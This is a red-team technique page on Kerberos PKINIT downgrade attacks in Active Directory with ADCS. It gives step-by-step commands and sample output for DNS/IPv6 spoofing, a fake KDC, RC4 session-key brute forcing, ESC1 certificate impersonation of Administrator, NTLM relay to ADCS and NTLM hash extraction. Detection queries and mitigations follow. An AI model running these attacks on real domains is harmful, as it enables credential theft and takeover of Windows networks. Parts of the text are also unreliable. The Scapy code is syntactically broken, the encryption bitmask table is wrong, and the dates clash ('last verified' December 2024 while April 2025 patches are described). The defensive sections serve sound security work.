# [CA-KERB-009]: PKINIT Downgrade Attacks

## 1. METADATA HEADER

| Attribute | Details |
|---|---|
| **Technique ID** | CA-KERB-009 |
| **MITRE ATT&CK v18.1** | [T1558 - Steal or Forge Kerberos Tickets](https://attack.mitre.org/techniques/T1558/) |
| **Tactic** | Credential Access |
| **Platforms** | Windows AD (Server 2016-2025) with ADCS |
| **Severity** | **HIGH** |
| **CVE** | N/A (multiple related: CVE-2022-33679, CVE-2022-33647, CVE-2025-26647) |
| **Technique Status** | ACTIVE (Partial Mitigations in Feb 2021+; Full Mitigations April 2025+) |
| **Last Verified** | 2024-12-15 |
| **Affected Versions** | Server 2016, 2019, 2022, 2025 (with weak PKINIT/ADCS config) |
| **Patched In** | KB5057784 (April 2025) - Full NTAuth validation; KB5014754 (January 2024) - Partial |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

**Note:** Sections 6 (Atomic Red Team) omitted because PKINIT downgrade is environment-specific and not included in atomic test libraries. All section numbers have been dynamically renumbered based on applicability.

---

## 2. EXECUTIVE SUMMARY

**Concept:** PKINIT (Public Key Cryptography for Initial Authentication) downgrade attacks exploit weaknesses in the Kerberos protocol's certificate-based authentication mechanism. An attacker who can perform a Man-in-the-Middle (MITM) attack can intercept the initial Kerberos authentication handshake and manipulate the Key Distribution Center (KDC)'s response to force the client to use weaker encryption algorithms (RC4-MD4 instead of AES-256) or weaker key derivation functions. Alternatively, an attacker who has obtained a valid X.509 certificate (through AD CS ESC vulnerabilities, Shadow Credentials, or certificate theft) can authenticate via PKINIT and request weak encryption types during the TGT exchange, allowing cryptographic attacks on the session key. These attacks completely undermine the security guarantees of certificate-based authentication and can lead to credential theft, privilege escalation, and lateral movement.

**Attack Surface:** PKINIT downgrade attacks affect any domain environment where:
1. ADCS (Active Directory Certificate Services) is deployed with weak template configurations
2. PKINIT is enabled (certificate-based authentication is supported)
3. Legacy encryption types (RC4, MD4) are still permitted in Kerberos policy
4. No MITM prevention measures (DNSSEC, IPv6 mitigations) are in place
5. KDC certificate validation is not enforced (pre-April 2025)

**Business Impact:** An attacker can forge or downgrade Kerberos tickets to impersonate any domain user, including domain administrators. This enables unauthorized access to sensitive systems, exfiltration of confidential data, lateral movement across the domain, and establishment of persistent backdoors. The attack is particularly dangerous because it exploits legitimate authentication mechanisms and can evade traditional password-based protections.

**Technical Context:** PKINIT downgrade attacks typically involve two stages: (1) MITM-based encryption downgrade via KDC response manipulation, or (2) direct certificate-based authentication with weak cipher requests. Both methods require interaction with the KDC but generate Event 4768 (TGT requested) entries that may appear benign without context. The attack succeeds because Kerberos clients default to accepting weak encryption types if offered by the KDC, and because certificate validation chains may be weak or improperly configured.

### Operational Risk

- **Execution Risk:** **MEDIUM** - Requires either MITM positioning or prior certificate compromise (via ESC); not trivial but achievable in realistic scenarios
- **Stealth:** **MEDIUM-HIGH** - PKINIT TGT requests blend into normal certificate-based authentication traffic; weak encryption requests are often not monitored
- **Reversibility:** **NO** - Forged TGT cannot be easily revoked; session escalation is immediate

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 5.2.3.3 | "Ensure 'Kerberos encryption' is set to 'AES'" |
| **CIS Benchmark** | 5.2.3.6 | "Ensure smart card logon is configured properly" |
| **DISA STIG** | V-220976 | Kerberos encryption types must not include RC4 or MD4 |
| **NIST 800-53** | AC-3 | Access Enforcement via cryptographic controls |
| **NIST 800-53** | IA-2 | Authentication using certificates must validate chain |
| **NIST 800-53** | SC-12 | Cryptographic mechanisms must use strong algorithms |
| **GDPR** | Art. 32 | Security of Processing - cryptographic integrity |
| **DORA** | Art. 9 | Protection and Prevention of authentication systems |
| **NIS2** | Art. 21 | Cyber Risk Management Measures |
| **ISO 27001** | A.10.1.1 | Cryptographic controls must use appropriate algorithms |
| **ISO 27005** | Risk Scenario | Compromise of Cryptographic Mechanisms |

---

## 3. TECHNICAL PREREQUISITES

**Required Privileges:**
- For MITM-based downgrade: Network access to intercept KDC communication (Layer 2/3 MITM position)
- For certificate-based downgrade: Control of a valid X.509 certificate (either legitimate or forged via ESC/Shadow Credentials)
- Ability to send Kerberos AS-REQ messages with custom encryption type options

**Required Access:**
- Network access to port 88/UDP or 88/TCP (Kerberos KDC)
- For MITM: Ability to perform DNS poisoning, ARP spoofing, or other MITM techniques
- For certificate attacks: Ability to extract or forge certificates

**Supported Versions:**

| Version | Status | Notes |
|---|---|---|
| **Windows Server 2016** | VULNERABLE | No weak encryption restrictions; accepts RC4, MD4 |
| **Windows Server 2019** | VULNERABLE | No weak encryption restrictions; accepts RC4, MD4 |
| **Windows Server 2022** | PARTIAL | January 2024 (KB5014754): Weak certificate validation detected but not enforced |
| **Windows Server 2025** | PARTIAL (Pre-April 2025) | Inherits 2022 behavior |
| **Windows Server 2025** | FIXED (Post-April 2025) | April 2025 (KB5057784): Full NTAuth validation enforced |

**Tools:**
- [Certipy](https://github.com/ly4k/Certipy) - ESC enumeration and certificate exploitation
- [PKINITtools (gettgtpkinit.py)](https://github.com/dirkjanm/PKINITtools) - PKINIT TGT request from certificate
- [Rubeus](https://github.com/GhostPack/Rubeus) - Windows-based PKINIT TGT request
- [Impacket](https://github.com/fortra/impacket) - Cross-platform PKINIT and Kerberos tools
- [ntlmrelayx.py](https://github.com/fortra/impacket) - NTLM relay to ADCS certificate request
- [PetitPotam](https://github.com/topotam/PetitPotam) - Coerce NTLM authentication via Kerberos
- [mitm6](https://github.com/dirkjanm/mitm6) - IPv6 DNS poisoning for MITM positioning

**Other Requirements:**
- Python 3.6+ (for Impacket and PKINITtools)
- Administrator rights on workstation (optional, for some MITM tools)
- Knowledge of target domain structure and certificate templates

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### 4.1 Identify PKINIT Configuration

#### Step 1: Check if ADCS is Deployed and PKINIT is Enabled

**Command (PowerShell - Any Domain-Joined Machine):**
```powershell
# Check if PKI infrastructure exists in AD
$PKI = Get-ADObject -Filter {ObjectClass -eq "pKIEnrollmentService"} -SearchBase "CN=Configuration,$(([ADSI]'').DistinguishedName)"

if ($PKI) {
    Write-Host "ADCS Detected - PKINIT likely enabled"
    $PKI | Select-Object DistinguishedName, Name
} else {
    Write-Host "No ADCS detected"
}

# Enumerate certificate templates
Get-ADObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,$(([ADSI]'').DistinguishedName)" -Filter * -Properties cn, msPKI-Certificate-Application-Policy | Select-Object cn, msPKI-Certificate-Application-Policy
```

**What to Look For:**
- pKIEnrollmentService objects = ADCS is deployed
- Certificate templates with "PKINIT Client Authentication" EKU = PKINIT enabled
- Vulnerable templates (ESC1, ESC3, ESC8) = potential attack vector

**Version Note:** Command works identically on Server 2016-2025; ADCS configuration is AD-level, not OS-version-specific.

#### Step 2: Enumerate Certificate Templates for Misconfigurations

**Command (Using Certipy - Linux):**
```bash
# Find vulnerable certificate templates
certipy-ad find -u domain_user -p password -dc-ip 192.168.1.10 -vulnerable

# Output will show ESC1, ESC2, ESC3, ESC8, ESC9, ESC13 vulnerabilities
# Example vulnerable template:
# [ESC1] Template Name: WebServer
# - Can be requested by: Domain Users
# - Client Authentication EKU: Enabled
# - SAN: Supply in Request (allows impersonation)
# - Enrollment Agent: Enabled
```

**What to Look For:**
- ESC1: Client Authentication EKU + Supply in Request + auto-issuance
- ESC3: Enrollment Agent + no manager approval
- ESC8: Web Enrollment without authentication
- Templates allowing Domain Users to enroll = low-privilege attack

#### Step 3: Check Kerberos Encryption Policy (Current State)

**Command (PowerShell - Domain Controller):**
```powershell
# Check Kerberos encryption types allowed
Get-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Lsa\Kerberos\Parameters' -Name KdcSupportedEncryptionTypes

# Bitmask meanings:
# 1 = DES-CBC-MD5 (DEPRECATED)
# 2 = RC4-HMAC (WEAK - should be disabled)
# 4 = HMAC-SHA1 (AES128) (ACCEPTABLE)
# 8 = HMAC-SHA1 (AES256) (STRONG)
# 16 = AES128-CTS-HMAC-SHA1
# 24 = AES (both 128 & 256) (BEST PRACTICE)

# Example vulnerable output:
# KdcSupportedEncryptionTypes : 31 (means DES, RC4, AES all allowed)

# Example secure output:
# KdcSupportedEncryptionTypes : 24 (means only AES allowed)
```

**What to Look For:**
- Value of 31 or higher = RC4, MD4 allowed = VULNERABLE
- Value of 24 = AES only = SECURE
- Missing key = default behavior (all types allowed) = VULNERABLE

**Version-Specific Behavior:**
- Server 2016-2019: No restrictions in place; must manually enforce
- Server 2022+: Settings in effect but not enforced by default
- Server 2025 (April 2025+): Enforced with KB5057784

#### Step 4: Check for Event 4768 (PKINIT TGT Requests)

**Command (PowerShell - Domain Controller):**
```powershell
# Search for recent PKINIT TGT requests
# Event 4768 with PATYPE field containing "15" = PKINIT authentication

Get-WinEvent -LogName Security -FilterXPath "*[System[(EventID=4768)]]" -MaxEvents 100 |
  ForEach-Object {
    $eventXml = [xml]$_.ToXml()
    $patype = $eventXml.Event.EventData.Data | Where-Object {$_.Name -eq "PreAuthType"} | Select-Object -ExpandProperty '#text'
    
    if ($patype -eq "15") {
      $user = $eventXml.Event.EventData.Data | Where-Object {$_.Name -eq "Account Name"} | Select-Object -ExpandProperty '#text'
      $cert = $eventXml.Event.EventData.Data | Where-Object {$_.Name -eq "CertThumbprint"} | Select-Object -ExpandProperty '#text'
      Write-Host "PKINIT TGT Request: User=$user, CertThumbprint=$cert"
    }
}

# Alerts to look for:
# - Frequent PKINIT requests from non-admin accounts
# - PKINIT requests from unusual sources
# - Multiple failed attempts followed by success (indicates downgrade probe)
```

**What to Look For:**
- PATYPE = 15 (PKINIT)
- CertThumbprint field = certificate thumbprint used
- Unusual patterns = repeated attempts from same source
- Non-existent certificates = forged/weak certs

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: MITM-Based Encryption Downgrade (CVE-2022-33647)

**Supported Versions:** Server 2016-2022 (pre-April 2025 patch)

**Prerequisites:** Attacker must be in MITM position (DNS spoofing, ARP poisoning, IPv6 RA, etc.)

#### Step 1: Establish MITM Position

**Objective:** Position attacker between client and KDC to intercept and modify Kerberos messages.

**Command (Using mitm6 - DNS Poisoning):**
```bash
# IPv6 DNS poisoning to intercept KDC traffic
mitm6 -d contoso.com

# This spoofs IPv6 RA (Router Advertisement) and DHCPv6 to redirect traffic
# Clients will send DNS requests to attacker's machine
# Output:
# [*] Using interface eth0
# [*] Listening for DHCPv6 requests
# [*] IPv6 RA spoofing enabled
```

**Command (Using DNS Cache Poisoning - Scapy):**
```python
# Alternative: Direct DNS spoofing via Scapy
from scapy.all import DNS, DNSQR, DNSRR, IP, UDP, send

# Craft fake DNS response for DC lookup
dns_response = IP(dst="192.168.1.100")/UDP(dport=53)/DNS(
    id=0x1234,
    qr=1,
    aa=1,
    ancount=1,
    ar=arcount=1,
    qd=DNSQR(qname="dc01.contoso.com"),
    an=DNSRR(rrname="dc01.contoso.com", rdata="192.168.1.50")  # Attacker's IP
)

send(dns_response)
```

**Expected Output:**
```
Client resolves DC01.contoso.com to attacker IP (192.168.1.50)
Client sends Kerberos AS-REQ to attacker's fake KDC
```

**What This Means:**
- Attacker can now intercept and modify Kerberos traffic
- Client believes attacker is legitimate KDC
- MITM position established for next steps

#### Step 2: Set Up Fake KDC (Responder or Custom Server)

**Objective:** Create a fake KDC that accepts client AS-REQ and responds with modified encryption options.

**Command (Using Responder - DNS/LLMNR Poisoning):**
```bash
# Simpler alternative: Use Responder for credential interception
responder -I eth0 -v

# This captures NTLM authentication attempts
# For Kerberos downgrade, need custom KDC implementation
```

**Command (Custom KDC - Impacket/minikerberos approach):**
```python
# Custom fake KDC using Python (pseudocode for illustration)
from minikerberos.protocol import AS_REQ, AS_REP, KerberosException
from socket import socket, AF_INET, SOCK_DGRAM

# Listen on port 88/UDP
kdc_socket = socket(AF_INET, SOCK_DGRAM)
kdc_socket.bind(("0.0.0.0", 88))

while True:
    data, client_addr = kdc_socket.recvfrom(4096)
    
    # Parse AS-REQ
    as_req = AS_REQ.from_asn1(data)
    
    # MODIFICATION: Force RC4-MD4 encryption in response
    as_req.etype = [23, 1]  # RC4-HMAC, DES (remove AES options)
    
    # Generate AS-REP with weak encryption
    as_rep = fake_kdc_response(as_req)
    
    # Send modified response
    kdc_socket.sendto(as_rep.to_asn1(), client_addr)
```

**What This Means:**
- Fake KDC now intercepts AS-REQ from client
- Modifies encryption type field to force RC4/MD4
- Client receives "KDC response" requesting weak encryption
- Client complies (if not configured to reject weak types)

#### Step 3: Force Client to Use Weak Encryption

**Objective:** Client receives modified KDC response with weak encryption (RC4-MD4) and uses it for subsequent authentication.

**Expected Behavior (Vulnerable Client):**
1. Client sends AS-REQ with supported etypes: [23 (RC4-HMAC), 17 (AES128), 18 (AES256)]
2. Fake KDC responds: "Only RC4-MD4 is supported" (0x17 error)
3. Client re-sends AS-REQ with etype=[23 (RC4-HMAC)]
4. Fake KDC responds with AS-REP encrypted with RC4-MD4
5. Client uses weak session key for TGT

**What This Means:**
- Encryption downgraded from AES-256 to RC4-MD4
- Session key now vulnerable to brute-force/cryptanalysis
- Next step: break weak encryption and extract credentials

**OpSec & Evasion:**
- MITM position must be maintained throughout AS exchange
- Timing attacks: Fake KDC response must arrive before real KDC's response
- To improve reliability: Block real KDC responses (firewall rules on attacker side)

#### Step 4: Cryptanalysis of Weak Session Key (CVE-2022-33679)

**Objective:** Extract the actual TGT session key by exploiting weaknesses in RC4-MD4 encryption.

**Exploitation:**
RC4-MD4 has a critical weakness: the encryption key is only 8 bytes, with no IV or salt. Combined with a known plaintext attack (client knows the timestamp in the encrypted pre-authentication), the attacker can:
1. Derive part of the RC4 keystream from the known plaintext (encrypted timestamp)
2. Brute-force remaining bits of the TGT session key (48 bytes, but only 40 bits of entropy)
3. Validate guess by checking if decrypted TGT has correct structure

**Command (PoC Proof-of-Concept - from Horizon3 or bdenneu):**
```python
# Simplified pseudocode (actual PoC on GitHub)
from Crypto.Cipher import ARC4, AES
from Crypto.Hash import MD4
import struct

# Known plaintext: timestamp in encrypted pre-auth (from AS-REP)
known_plaintext = b"2024010112345600Z"  # Client timestamp

# Attacker extracts RC4 keystream portion from encrypted pre-auth
# (This is a known plaintext attack scenario)

# Then brute-force the 40-bit TGT session key
for guess in range(2**40):
    # Attempt to decrypt TGT with guessed key
    tgt_key = struct.pack(">Q", guess)
    cipher = ARC4.new(tgt_key)
    
    # Try to decrypt; valid TGT will have ASN.1 structure
    decrypted = cipher.decrypt(tgt_ciphertext)
    
    if decrypted.startswith(b'\x60'):  # ASN.1 sequence tag
        print(f"Found TGT session key: {tgt_key.hex()}")
        break
```

**What This Means:**
- Attacker now has valid TGT session key
- Can decrypt TGT and extract PAC (Privilege Attribute Certificate)
- Can request service tickets as the authenticated user
- Full credential theft achieved

**References:**
- [Horizon3 - CVE-2022-33679 to Unauthenticated Kerberoasting](https://horizon3.ai/attack-research/attack-blogs/from-cve-2022-33679-to-unauthenticated-kerberoasting/)
- [bdenneu GitHub PoC](https://github.com/bdenneu/CVE-2022-33679)

---

### METHOD 2: Direct PKINIT Certificate-Based Authentication with Weak Encryption

**Supported Versions:** Server 2016-2025 (vulnerable with weak cert validation or encryption policy)

**Prerequisites:**
- Valid X.509 certificate (either legitimate or forged via ESC/Shadow Credentials)
- Certificate must chain to a CA trusted by the domain (or attacker uses weak validation bypass)

#### Step 1: Obtain or Forge X.509 Certificate

**Objective:** Acquire a valid certificate for the target user to use with PKINIT authentication.

**Option A: ESC1 Template Exploitation (Certipy)**

```bash
# Enumerate vulnerable templates
certipy-ad find -u domain_user@contoso.com -p 'Password123' -dc-ip 192.168.1.10 -vulnerable -output vulnerable

# Request certificate as Domain Admin (impersonation via ESC1)
certipy-ad req -u domain_user@contoso.com -p 'Password123' -dc-ip 192.168.1.10 \
  -ca 'contoso-CA' -template 'WebServer' -upn 'Administrator@contoso.com' -out admin.pfx

# Output:
# [*] Requesting certificate for 'Administrator@contoso.com'
# [+] Certificate written to admin.pfx
```

**Option B: Shadow Credentials Attack**

```bash
# Add alternate certificate credential to user account (requires WRITE on user object)
certipy-ad shadow -username domain_user -password 'Password123' -action add \
  -cert ./attacker_cert.pfx -cert-pass 'password' -dc-ip 192.168.1.10 -u contoso.com/user@user

# This creates a certificate-based credential alternative
```

**Option C: NTLM Relay to ADCS (ntlmrelayx + PetitPotam)**

```bash
# Step 1: Coerce NTLM auth from DC using PetitPotam
python3 PetitPotam.py 192.168.1.50 192.168.1.10

# Step 2: Relay NTLM to ADCS HTTP enrollment (ntlmrelayx)
python3 ntlmrelayx.py -t http://192.168.1.20/certsrv/certfnsh.asp \
  -smb2support --adcs --template 'WebServer'

# Output:
# [*] NTLM relay successful, certificate issued
# [+] Certificate saved as certificate.pfx
```

**Expected Output:**
```
Certificate obtained for target user (Administrator, Domain Admin, etc.)
Certificate format: PFX (PKCS#12) with private key
Ready for PKINIT authentication
```

**What This Means:**
- Attacker now has a valid certificate for impersonating target user
- Certificate chains to a trusted domain CA
- Can be used for Kerberos PKINIT authentication

#### Step 2: Request TGT via PKINIT Using Certificate

**Objective:** Authenticate to KDC using the certificate, obtaining a TGT encrypted with weak session key (if downgrade is possible).

**Command (Using gettgtpkinit.py - Linux/Linux Cross-Platform):**
```bash
# Convert PFX certificate to TGT via PKINIT
python3 gettgtpkinit.py contoso.com/Administrator \
  -cert-pfx admin.pfx -pfx-pass 'certificate_password' \
  -dc-ip 192.168.1.10 admin.ccache

# Output:
# [*] Loading certificate and key from file...
# [*] Requesting TGT via PKINIT
# [+] TGT obtained successfully
# [+] AS-REP encryption key: 5769dff44ebeaa5a37b4e9f7005f63063ffd7c198b747ae72021901e8063b0e3
# [+] TGT saved to admin.ccache
```

**Command (Using Rubeus - Windows):**
```powershell
# PKINIT TGT request using certificate (Rubeus v1.6.4+)
.\Rubeus.exe asktgt /user:Administrator /domain:contoso.com \
  /certificate:admin.pfx /password:certificate_password /ptt

# Output:
# [*] Action: Ask for TGT via PKINIT
# [*] Using certificate from admin.pfx
# [+] TGT obtained and injected into LSASS
```

**Expected Output:**
```
TGT successfully obtained
TGT cached and ready for use
Can now request service tickets using this TGT
```

**What This Means:**
- Attacker successfully authenticated as target user (Administrator)
- TGT in hand allows impersonation of that user
- Lateral movement and privilege escalation achieved

**OpSec & Evasion:**
- PKINIT TGT requests generate Event 4768 with PATYPE=15
- Requests blend into normal certificate-based logon traffic (smart card users)
- No password guessing attempts (event logs don't show repeated failed attempts)
- Evasion: Configure weak encryption during TGT request to match organization's security posture

#### Step 3: Request Weak Encryption During PKINIT (Optional Downgrade)

**Objective:** Force KDC to return TGT encrypted with weak algorithm (RC4, MD4) if still allowed.

**Command (gettgtpkinit.py with etype specification):**
```bash
# Request TGT with explicit weak encryption type
python3 gettgtpkinit.py contoso.com/Administrator \
  -cert-pfx admin.pfx -pfx-pass 'password' \
  -dc-ip 192.168.1.10 -etype 23 \  # Force RC4-HMAC (etype 23)
  admin_weak.ccache

# This only succeeds if RC4 is still permitted in KdcSupportedEncryptionTypes policy
# Output (if successful):
# [+] TGT obtained with RC4-HMAC encryption
# [+] Weak encryption session key is vulnerable to cryptanalysis
```

**Expected Output (Vulnerable DC):**
```
TGT encrypted with RC4 (etype 23)
Session key now vulnerable to brute-force attacks
```

**Expected Output (Patched DC - April 2025+):**
```
[-] Weak encryption type not supported
[-] KDC enforces AES-only policy
```

**What This Means:**
- If successful: Weak TGT session key vulnerable to extraction
- If failed: DC has proper encryption restrictions (security working as intended)

#### Step 4: Extract NTLM Hash via UnPAC-the-Hash (Optional)

**Objective:** Use the TGT session key to decrypt PAC and extract NTLM hash (unique to PKINIT).

**Command (Using getnthash.py from PKINITtools):**
```bash
# Extract NTLM hash from TGT obtained via PKINIT
python3 getnthash.py -key 5769dff44ebeaa5a37b4e9f7005f63063ffd7c198b747ae72021901e8063b0e3 \
  contoso.com/Administrator admin.ccache

# This decrypts the PAC_CREDENTIAL_INFO structure in the TGT
# Output:
# [+] Administrator's NTLM hash: 8846f7eaee8fb117ad06bdd830b7586c
```

**What This Means:**
- NTLM hash extracted without knowing original password
- Hash can be used for:
  - Pass-the-Hash attacks
  - Offline cracking (if weak)
  - Further lateral movement

**References:**
- [PKINITtools GitHub - gettgtpkinit & getnthash](https://github.com/dirkjanm/PKINITtools)
- [Lares Labs - UnPAC-the-Hash](https://labs.lares.com/fear-kerberos-pt2/)

---

### METHOD 3: Weak Certificate Validation Bypass (CVE-2025-26647)

**Supported Versions:** Server 2016-2022, Server 2025 (pre-April 2025)

**Prerequisites:** Certificate does not chain to a CA in the NTAuth store (weak validation environment)

#### Step 1: Create Self-Signed Certificate (No CA Chain)

**Objective:** Generate a certificate that impersonates target user but is NOT signed by a trusted CA.

**Command (Using OpenSSL):**
```bash
# Create self-signed certificate for Administrator
openssl req -x509 -newkey rsa:2048 -keyout admin.key -out admin.crt -days 365 -nodes \
  -subj "/CN=Administrator/O=CONTOSO/C=US"

# Convert to PFX format
openssl pkcs12 -export -out admin.pfx -inkey admin.key -in admin.crt \
  -password pass:certificate_password

# This certificate will NOT chain to NTAuth (not signed by domain CA)
```

**What This Means:**
- Certificate looks valid but doesn't chain to trusted CA
- Pre-April 2025 DCs: Accept the certificate (weak validation)
- April 2025+ DCs: Reject with Event ID 39 or 45 (requires KB5057784)

#### Step 2: Request TGT Using Self-Signed Certificate

**Command:**
```bash
# Attempt PKINIT with self-signed cert (will succeed pre-April 2025)
python3 gettgtpkinit.py contoso.com/Administrator \
  -cert-pem admin.crt -key-pem admin.key \
  -dc-ip 192.168.1.10 admin.ccache

# Pre-April 2025 (Vulnerable):
# [+] TGT obtained successfully despite weak cert chain

# April 2025+ (Patched):
# [-] KDC rejected certificate: not in NTAuth store
# [-] Event ID 45 logged: "Certificate valid but not in NTAuth"
```

**What This Means:**
- Weak certificate validation allows impersonation
- Patched systems reject out-of-chain certificates
- Mitigation requires KB5057784 or later

---

## 6. TOOLS & COMMANDS REFERENCE

### [Certipy](https://github.com/ly4k/Certipy)

**Version:** 4.3+  
**Supported Platforms:** Linux, macOS, Windows (Python 3.6+)

**Installation:**
```bash
pip3 install certipy-ad
```

**Usage:**
```bash
# Find vulnerable ADCS templates
certipy-ad find -u domain_user -p password -dc-ip 192.168.1.10 -vulnerable

# Request certificate via ESC1
certipy-ad req -u domain_user -p password -dc-ip 192.168.1.10 \
  -ca CA-NAME -template WebServer -upn Administrator@contoso.com

# Authenticate via PKINIT
certipy-ad auth -pfx admin.pfx -ldap-shell -dc-ip 192.168.1.10
```

---

### [PKINITtools](https://github.com/dirkjanm/PKINITtools)

**Version:** Latest from GitHub  
**Supported Platforms:** Linux, macOS, Windows (Python 3.6+)

**Installation:**
```bash
git clone https://github.com/dirkjanm/PKINITtools
cd PKINITtools
pip3 install -r requirements.txt
```

**Usage:**
```bash
# Request TGT via PKINIT
python3 gettgtpkinit.py domain.com/user -cert-pfx user.pfx -pfx-pass password output.ccache

# Extract NTLM hash from TGT
python3 getnthash.py -key <as-rep-key> domain.com/user output.ccache

# Request service ticket via S4U2Self
python3 gets4uticket.py kerberos+ccache://domain.com\\user:output.ccache@DC.domain.com \
  cifs/target.domain.com@domain.com targetuser output_st.ccache
```

---

### [Rubeus](https://github.com/GhostPack/Rubeus)

**Version:** 1.6.4+  
**Supported Platforms:** Windows

**Usage (PKINIT):**
```powershell
# Request TGT via PKINIT certificate
.\Rubeus.exe asktgt /user:Administrator /domain:contoso.com \
  /certificate:admin.pfx /password:cert_password /ptt

# Verify ticket injection
.\Rubeus.exe triage
```

---

### [mitm6](https://github.com/dirkjanm/mitm6)

**Version:** Latest  
**Supported Platforms:** Linux

**Installation:**
```bash
pip3 install mitm6
```

**Usage:**
```bash
# IPv6 DNS poisoning to establish MITM
mitm6 -d contoso.com
```

---

## 7. SPLUNK DETECTION RULES

### Rule 1: PKINIT TGT Request Detection

**Rule Configuration:**
- **Required Index:** `wineventlog`
- **Required Sourcetype:** `WinEventLog:Security`
- **Required Fields:** `EventCode`, `PreAuthType`, `Account_Name`
- **Alert Threshold:** Alert on any PKINIT (PreAuthType=15) from sensitive accounts
- **Applies To Versions:** All (Server 2016-2025)

**SPL Query:**
```spl
index=wineventlog source=WinEventLog:Security EventCode=4768 PreAuthType=15
| stats count by Account_Name, Client_Address, CertThumbprint
| where Account_Name IN ("Administrator*", "*Domain Admin*", "*Enterprise Admin*")
| eval risk="HIGH"
```

**What This Detects:**
- Event 4768 with PreAuthType = 15 (PKINIT)
- Filtered for sensitive accounts
- Shows certificate thumbprint used

---

### Rule 2: Weak Encryption Type Downgrade

**SPL Query:**
```spl
index=wineventlog source=WinEventLog:Security EventCode=4768
| where EType IN (23, 1, 3)  # RC4-HMAC, DES, RC4
| stats count by Account_Name, EType, Client_Address
| eval alert_level="HIGH"
```

---

## 8. MICROSOFT SENTINEL DETECTION

### Query 1: PKINIT Authentication Anomalies

**KQL Query:**
```kusto
SecurityEvent
| where EventID == 4768
| extend PreAuthType = extract("PreAuthType: (\\d+)", 1, EventData)
| where PreAuthType == "15"  // PKINIT
| extend CertThumbprint = extract("CertThumbprint: ([A-F0-9]+)", 1, EventData)
| where Account_Name in ("Administrator", "Domain Admins", "Enterprise Admins")
| project TimeGenerated, Account_Name, Client_IP, CertThumbprint
| summarize AlertCount = count() by Account_Name, bin(TimeGenerated, 1h)
| where AlertCount > 3  // Threshold
```

---

## 9. WINDOWS EVENT LOG MONITORING

**Event ID: 4768 (TGT Request)**

**Filter for PKINIT:**
- `PreAuthType` field = 15 (PKINIT)
- `CertThumbprint` field populated
- Cross-reference certificate with NTAuth trusted CAs

**Event ID: 39 (Certificate Validation Failure - January 2024+)**
- Indicates weak certificate mapping

**Event ID: 45 (Certificate Not in NTAuth Store - April 2025+)**
- Indicates self-signed or untrusted CA certificate

**Manual Configuration Steps (Group Policy):**
1. Open **gpmc.msc**
2. Navigate to **Computer Configuration → Policies → Windows Settings → Security Settings → Advanced Audit Policy Configuration**
3. Enable: **Audit Kerberos Service Ticket Operations** (Success and Failure)
4. Enable: **Audit Kerberos Authentication Service** (Success and Failure)
5. Run `gpupdate /force`

---

## 10. SYSMON DETECTION PATTERNS

```xml
<Sysmon schemaversion="4.82">
  <!-- Monitor for Certipy execution -->
  <RuleGroup name="Process Creation" groupRelation="or">
    <ProcessCreate onmatch="include">
      <CommandLine condition="contains">certipy</CommandLine>
      <CommandLine condition="contains">-template</CommandLine>
      <CommandLine condition="contains">-upn</CommandLine>
    </ProcessCreate>
  </RuleGroup>

  <!-- Monitor for PKINITtools usage -->
  <RuleGroup name="Process Creation" groupRelation="or">
    <ProcessCreate onmatch="include">
      <CommandLine condition="contains">gettgtpkinit</CommandLine>
      <CommandLine condition="contains">getnthash</CommandLine>
      <CommandLine condition="contains">-cert-pfx</CommandLine>
    </ProcessCreate>
  </RuleGroup>
</Sysmon>
```

---

## 11. MICROSOFT DEFENDER FOR CLOUD

**Alert Name:** "Suspicious Kerberos PKINIT authentication detected"  
**Alert Name:** "Weak encryption type requested in Kerberos"

**Manual Configuration Steps:**
1. Navigate to **Azure Portal → Microsoft Defender for Cloud → Environment Settings**
2. Enable: **Defender for Identity**
3. Configure alert rules for PKINIT activity
4. Alert on accounts requesting weak encryption

---

## 12. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**Mitigation 1: Apply April 2025 Security Patch (KB5057784)**

**Applies To Versions:** Server 2016-2025

**What It Does:** Enforces NTAuth certificate chain validation; rejects self-signed or untrusted CA certificates used for PKINIT.

**Manual Steps:**
1. Open **Settings → Update & Security**
2. Click **Check for updates**
3. Install April 2025 Windows Update
4. Restart Domain Controllers
5. Verify patch:
```powershell
Get-Hotfix | Where-Object {$_.HotFixID -match "KB5057784|KB5014754"}
```

---

**Mitigation 2: Restrict Encryption Types to AES Only**

**Applies To Versions:** All (Server 2016-2025)

**Manual Steps (Group Policy):**
1. Open **gpmc.msc**
2. Navigate to **Computer Configuration → Policies → Windows Settings → Security Settings → Local Policies → Security Options**
3. Find: **Network security: Kerberos allowed encryption types**
4. Set to: **AES256_HMAC_SHA1, AES128_HMAC_SHA1** (remove RC4, MD4, DES)
5. Run `gpupdate /force`

**Manual Steps (PowerShell - Direct):**
```powershell
# Set KDC encryption policy to AES only
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Lsa\Kerberos\Parameters' `
  -Name KdcSupportedEncryptionTypes -Value 24  # 24 = AES128 + AES256

# Force replication to all DCs
$DCs = Get-ADDomainController -Filter *
foreach ($DC in $DCs) {
    Invoke-Command -ComputerName $DC.Name -ScriptBlock {
        Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Lsa\Kerberos\Parameters' `
          -Name KdcSupportedEncryptionTypes -Value 24
    }
}
```

**Validation Command:**
```powershell
Get-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Lsa\Kerberos\Parameters' -Name KdcSupportedEncryptionTypes

# Expected output:
# KdcSupportedEncryptionTypes : 24
```

---

**Mitigation 3: Audit and Remediate ADCS Misconfigurations (ESC)**

**Applies To Versions:** All (if ADCS deployed)

**Objective:** Remove vulnerable certificate templates and restrict enrollment.

**Manual Steps (Using Certipy):**
```bash
# Find vulnerable templates
certipy-ad find -u domain_user -p password -dc-ip 192.168.1.10 -vulnerable -output findings

# Review findings for ESC1, ESC3, ESC8
# Disable vulnerable templates via AD or CA management console
```

**Manual Steps (Via Active Directory):**
1. Open **Active Directory Users and Computers**
2. Navigate to **Configuration → Public Key Services → Certificate Templates**
3. Right-click vulnerable templates (WebServer, User, Computer, etc.)
4. **Properties → Security**
5. Remove "Enroll" and "Autoenroll" permissions for Domain Users
